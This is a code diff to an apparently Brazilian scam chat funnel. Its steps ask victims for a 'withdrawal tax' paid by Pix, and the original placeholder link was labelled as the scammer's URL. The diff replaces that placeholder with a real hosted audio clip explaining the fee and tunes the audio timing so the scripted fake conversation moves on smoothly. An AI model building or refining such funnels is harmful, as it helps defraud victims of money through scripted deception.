@@ -303,7 +303,7 @@ const funnelDefinition: {
           "Chave Pix": "{{chavePix}}",
           "Imposto de Saque": "{{taxaValor}}"
         },
-        "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3"
+        "audioUrl": "https://media.vocaroo.com/mp3/16Zw1tvwsXFB"
       },
       "nextStep": "step13_final_justification_and_cta"
     },
@@ -690,7 +690,8 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                      nextStepTransitionDelayMs = msgData.message ? 2500 : 1200;
                 }
             } else {
-                nextStepTransitionDelayMs = 10000; 
+                // Set by audio 'ended' event, but default if audio fails
+                nextStepTransitionDelayMs = (audioPlayerRef.current?.duration || 8) * 1000 + 1500; 
             }
         }
 
@@ -740,9 +741,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         setCurrentPlayingAudioId(null);
         
         const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
+        const currentMessageWithAudio = messages.find(m => m.id === currentPlayingAudioId);
+
         if (stepConfig?.type === 'displayMessage' && 
             (stepConfig.data as FlowStepDataDisplayMessage).audioUrl && 
-            messages.find(m => m.id === currentPlayingAudioId)?.audioUrl === (stepConfig.data as FlowStepDataDisplayMessage).audioUrl &&
+            currentMessageWithAudio?.audioUrl === (stepConfig.data as FlowStepDataDisplayMessage).audioUrl &&
             stepConfig.nextStep) {
            if(autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); 
            handleUserActionAndNavigate(stepConfig.nextStep);
